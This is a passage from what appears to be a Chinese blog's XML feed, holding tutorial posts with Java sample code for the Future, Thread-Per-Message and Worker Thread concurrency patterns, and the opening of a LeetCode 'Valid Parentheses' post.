<p>获取Future劫色的线程会在稍后使用Future觉得来获取运行结果。这与凭着提货单去取蛋糕非常相似。如果运行结果已经出来了，那么直接领取即可；如果运行结果还没有出来，那么需要等待结果出来。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在Future模式中，程序一旦发出请求，就会立即获取返回值。也就是说，会有下面这样的返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Data data = host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br></pre></td></tr></table></figure>
<p>但是，这里的返回值data并非请求的运行结果。为了获取请求的运行结果，我们刚刚启动了其他线程去计算。也就是说，这个返回值并不是蛋糕自身，而是蛋糕的提货单。</p>
<p>如下所示，过了一段时间之后，线程会先用data的getContent方法取获取运行结果。</p>
<p>这相当于使用提货单提取我们订购的蛋糕。如果其他线程处理完了请求，那么调用getContent的线程会立即从该方法返回；而如果其他线程还没有处理完请求，那么调用getContent的线程，则会继续等待运行结果。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>向Host发出请求并获取数据的类</td>
</tr>
<tr>
<td>Host</td>
<td>向请求返回FutureData的实例的类</td>
</tr>
<tr>
<td>Data</td>
<td>表示访问数据的方法的接口。由FutureData和RealData实现该接口。</td>
</tr>
<tr>
<td>FutureData</td>
<td>表示RealData的“提货单”的类。其他线程会创建RealData的实例。</td>
</tr>
<tr>
<td>RealData</td>
<td>表示实际数据的类。构造函数的处理会花费很长的时间。</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会调用request方法三次。接着它会接受三个Data（data1、data2、data3）作为返回值。这三个返回值实际上都是FutureData的实例，无需花费时间即可获取它们，类似蛋糕的提货单。因此，这相当于获取了三张提货单。</p>
<p>然后，为了表示Main类取执行了其他操作，我们让其sleep大约2秒。接下来，分别调用之前接收到的返回值data1、data2和data3的getContent方法来获取真正希望获取的结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main Begin"</span>);</span><br><span class="line">		</span><br><span class="line">		Host host = <span class="keyword">new</span> Host();</span><br><span class="line">		Data data1 = host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br><span class="line">		Data data2 = host.request(<span class="number">20</span>, <span class="string">'B'</span>);</span><br><span class="line">		Data data3 = host.request(<span class="number">30</span>, <span class="string">'C'</span>);</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"Main Other Job Begin"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		System.out.println(<span class="string">"data1 = "</span> + data1.getContent());</span><br><span class="line">		System.out.println(<span class="string">"data3 = "</span> + data3.getContent());</span><br><span class="line">		System.out.println(<span class="string">"data2 = "</span> + data2.getContent());</span><br><span class="line">		System.out.println(<span class="string">"Main End"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Host类"><a href="#Host类" class="headerlink" title="Host类"></a>Host类</h3><p>Host类首先会创建FutureData的实例。这并不会耗费很长时间。该实例会被作为返回值返回给调用者。</p>
<p>接着，它会启动一个新的线程并在新线程中创建RealData实例。虽然创建RealData的实例需要花费很长的时间，但这是在新线程中进行的，并不会影响Main类的线程的处理。</p>
<p>新线程会努力地创建RealData实例。当realData创建完成后，线程会调用setReadData方法将其设置到future字段中。由于创建realData会花费一些时间，所以设置future字段就是稍后的事情了。</p>
<p>接着调用了request方法的线程会在新线程启动后拿到返回值future并立即返回。</p>
<p>总结起来，执行request的线程会做以下三件事：</p>
<ol>
<li>创建FutureData的实例</li>
<li>启动一个新线程，用于创建RealData</li>
<li>将FutureData的实例作为返回值返回给调用者。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Data <span class="title">request</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> count, <span class="keyword">final</span> <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"    request("</span> + count + <span class="string">", "</span> + c + <span class="string">") BEGIN"</span>);</span><br><span class="line">		<span class="keyword">final</span> FutureData future = <span class="keyword">new</span> FutureData();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">new</span> Thread() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">				RealData realData = <span class="keyword">new</span> RealData(count, c);</span><br><span class="line">				future.setRealData(realData);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;.start();</span><br><span class="line">		System.out.println(<span class="string">"    request("</span> + count + <span class="string">", "</span> + c + <span class="string">") END"</span>);</span><br><span class="line">		<span class="keyword">return</span> future;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="Data接口"><a href="#Data接口" class="headerlink" title="Data接口"></a>Data接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getContent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FutureData类"><a href="#FutureData类" class="headerlink" title="FutureData类"></a>FutureData类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FutureData</span> <span class="keyword">implements</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> RealData realData = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> ready = <span class="keyword">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setRealData</span><span class="params">(RealData realData)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (ready) &#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">this</span>.realData = realData;</span><br><span class="line">		<span class="keyword">this</span>.ready = <span class="keyword">true</span>;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (!ready) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> realData.getContent();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RealData类"><a href="#RealData类" class="headerlink" title="RealData类"></a>RealData类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RealData</span> <span class="keyword">implements</span> <span class="title">Data</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String content;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">RealData</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"    making RealData("</span> + count + <span class="string">", "</span> + c + <span class="string">") BEGIN"</span>);</span><br><span class="line">		<span class="keyword">char</span>[] buffer = <span class="keyword">new</span> <span class="keyword">char</span>[count];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">			buffer[i] = c;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">100</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"    making RealData("</span> + count + <span class="string">", "</span> + c + <span class="string">") END"</span>);</span><br><span class="line">		<span class="keyword">this</span>.content = <span class="keyword">new</span> String(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> content;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Future模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Thread-Per-Message模式</title>
    <url>/2018/10/14/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/7.Thread-Per-Message%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Thread-Per-Message-模式"><a href="#Thread-Per-Message-模式" class="headerlink" title="Thread-Per-Message 模式"></a>Thread-Per-Message 模式</h2><p>所谓Per，就是“每~”的意思。因此，Thread-Per-Message直译过来就是“每个消息一个线程”的意思。Message在这里可以理解为“命令”或“请求”。为每个命令或请求新分配一个线程，由这个线程来执行处理。</p>
<p>在Thread-Per-Message 模式中，消息的“委托端”和“执行端”是不同的线程。消息的委托端线程会告诉执行端线程“这项工作就交给你了”。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在示例程序中，Main类委托Host类来显示字符。Host类会创建并启动一个线程，来处理该委托。启动的线程使用Helper类来执行实际的显示。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>向Host发送字符显示请求的类</td>
</tr>
<tr>
<td>Host</td>
<td>针对请求创建线程的类</td>
</tr>
<tr>
<td>Helper</td>
<td>提供字符显示功能的被动类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会先创建一个Host类的实例，然后调用Host的request方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"Main begin"</span>);</span><br><span class="line">		Host host = <span class="keyword">new</span> Host();</span><br><span class="line">		host.request(<span class="number">10</span>, <span class="string">'A'</span>);</span><br><span class="line">		host.request(<span class="number">20</span>, <span class="string">'B'</span>);</span><br><span class="line">		host.request(<span class="number">30</span>, <span class="string">'C'</span>);</span><br><span class="line">		System.out.println(<span class="string">"Main end"</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Host类"><a href="#Host类" class="headerlink" title="Host类"></a>Host类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Helper helper = <span class="keyword">new</span> Helper();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">request</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> count, <span class="keyword">final</span> <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"        request("</span> + count + <span class="string">", "</span> + c + <span class="string">") begin"</span>);</span><br><span class="line">		<span class="keyword">new</span> Thread() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">				helper.handle(count, c);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;.start();</span><br><span class="line">		System.out.println(<span class="string">"        request("</span> + count + <span class="string">", "</span> + c + <span class="string">") end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Helper类"><a href="#Helper类" class="headerlink" title="Helper类"></a>Helper类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span> <span class="params">(<span class="keyword">int</span> count, <span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"        handle("</span> + count + <span class="string">", "</span> + c + <span class="string">") begin"</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">			slowly();</span><br><span class="line">			System.out.println(c);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">""</span>);</span><br><span class="line">		System.out.println(<span class="string">"        handle("</span> + count + <span class="string">", "</span> + c + <span class="string">") end"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">slowly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(<span class="number">100</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Thread-Per-Message 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Worker Thread 模式</title>
    <url>/2018/10/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/8.Worker%20Thread%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Worker-Thread-模式"><a href="#Worker-Thread-模式" class="headerlink" title="Worker Thread 模式"></a>Worker Thread 模式</h2><p>Worker的意思是工作的人，劳动者。在Worker Thread模式中，工人线程（worker thread）会逐个取回工作并进行处理。当所有的工作全部完成之后，工人线程会等待新的工作到来。</p>
<p>Worker Thread模式也被称作为Background Thread（背景线程）模式。另外，如果从“保存多个工人线程的场所”这一点看，我们也可以称这种模式为Thread Pool（线程池）模式。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>下表列举了示例程序中的所有类。示例程序的行为如下。</p>
<p>ClientThread类的线程会向Channel类发送工作请求（委托）</p>
<p>Channel类的实例雇佣了五个工人线程（WorkerThread）进行工作。所有工人线程都在等待工作请求的到来。</p>
<p>工人的请求到来之后，工人线程会从Channel哪里获取一项工作请求并开始工作。工作完成后，工人线程会回到Channel哪里等待下一项工作请求。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>表示发出工作请求的线程的类</td>
</tr>
<tr>
<td>Request</td>
<td>可以工作请求的类</td>
</tr>
<tr>
<td>Channel</td>
<td>接收工作请求并将工作请求交给工人线程的类</td>
</tr>
<tr>
<td>WorkerThread</td>
<td>表示工人线程的类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会创建一个雇佣了五个工人线程的Channel实例，并将其共享给三个ClientThread（A、B、C）。</p>
<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Channel channel = <span class="keyword">new</span> Channel(<span class="number">5</span>);</span><br><span class="line">		</span><br><span class="line">		channel.startWorkers();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"A"</span>, channel).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"B"</span>, channel).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"C"</span>, channel).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><p>ClientThread类是发送工作请求的类。“发送工作请求”这个行为对应的是示例程序中的以下处理</p>
<ol>
<li>创建Request实例</li>
<li>将该实例传递给Channel类的putRequest方法</li>
</ol>
<p>为了让程序行为有些变化，这里让程序sleep一段随机长的时间。</p>
<p>发送工作请求的ClientThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Channel channel;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(String name, Channel channel)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.channel = channel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				Request request = <span class="keyword">new</span> Request(getName(), i);</span><br><span class="line">				channel.putRequest(request);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h3><p>Request类是表示工作请求的类。</p>
<p>name字段表示发送请求的委托者的名字，number字段表示请求的编号。在示例程序中，name的值是A、B、C之一，number的只是0，1，2，3.。execute方法是负责“处理”请求的方法。</p>
<p>表示工作请求的Request类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> number;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Request</span><span class="params">(String name, <span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.number = number;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName()  + <span class="string">" execute "</span>  + <span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Request from "</span> + name + <span class="string">" No."</span> + number + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Channel类"><a href="#Channel类" class="headerlink" title="Channel类"></a>Channel类</h3><p>Channel类是负责传递工作请求以及保存工人线程的类。</p>
<p>为了传递工作请求，我们在Channel类中定义了requestQueue字段。该字段将扮演保存请求的队列的角色。putRequest方法用于将请求加入到队列中，takeRequest方法则用于取出队列中的请求。这里使用了Producer-Consumer模式。另外。为了实现putRequest方法和takeRequest方法，这里还使用了Guarded Suspension模式。</p>
<p>Channel勒种定义了一个用于保存工人线程的threadPool字段。threadPool是WorkerThread的数组。Channel类的构造函数会初始化threadPool字段并创建WorkerThread的实例。数组的大小由threads决定。</p>
<p>这里为工人线程赋予的名字分别为Worker-0，Worker-1，.。</p>
<p>startWorkers方法是用于启动所有工人线程的方法。</p>
<p>负责传递工作请求以及保存工人线程的Channel类</p>
<h3 id="Channel类-1"><a href="#Channel类-1" class="headerlink" title="Channel类"></a>Channel类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Channel</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_REQUEST = <span class="number">100</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Request[] requestQueue;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> WorkerThread[] threadPool;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Channel</span><span class="params">(<span class="keyword">int</span> threads)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = <span class="keyword">new</span> Request[MAX_REQUEST];</span><br><span class="line">		<span class="keyword">this</span>.tail = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.head = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		threadPool = <span class="keyword">new</span> WorkerThread[threads];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadPool.length;i++) &#123;</span><br><span class="line">			threadPool[i] = <span class="keyword">new</span> WorkerThread(<span class="string">"Worker-"</span> + i, <span class="keyword">this</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadPool.length;i++) &#123;</span><br><span class="line">			threadPool[i].start();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">putRequest</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span>(count &gt;= requestQueue.length) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		requestQueue[tail] = request;</span><br><span class="line">		tail = (tail + <span class="number">1</span>) % requestQueue.length;</span><br><span class="line">		count++;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Request <span class="title">takeRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span>(count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Request request = requestQueue[head];</span><br><span class="line">		head = (head + <span class="number">1</span>) % requestQueue.length;</span><br><span class="line">		count--;</span><br><span class="line">		notifyAll();</span><br><span class="line">		<span class="keyword">return</span> request;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WorkerThread类"><a href="#WorkerThread类" class="headerlink" title="WorkerThread类"></a>WorkerThread类</h3><p>WorkerThread类表示工人线程的类。</p>
<p>工人线程会进行工作。“进行工作”这个处理对应示例程序中的以下处理。</p>
<ol>
<li>调用takeRequest方法从Channel的实例中获取一个Request的实例</li>
<li>调用Request的实例的execute方法</li>
</ol>
<p>工人线程一旦启动后就会一直工作。也就是说，它会一直执行“获取一个新的Request，然后调用它的execute方法”的处理。</p>
<p>表示工人线程的WorkerThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Channel channel;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WorkerThread</span><span class="params">(String name, Channel channel)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.channel = channel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			Request request = channel.takeRequest();</span><br><span class="line">			request.execute();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Worker Thread 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>20. Valid Parentheses</title>
    <url>/2018/09/14/LeetCode/leetcode-000020.%20Valid%20Parentheses/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<pre><code>左括号必须用相同类型的右括号闭合。
左括号必须以正确的顺序闭合。</code></pre><p>注意空字符串可被认为是有效字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"()[]&#123;&#125;"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

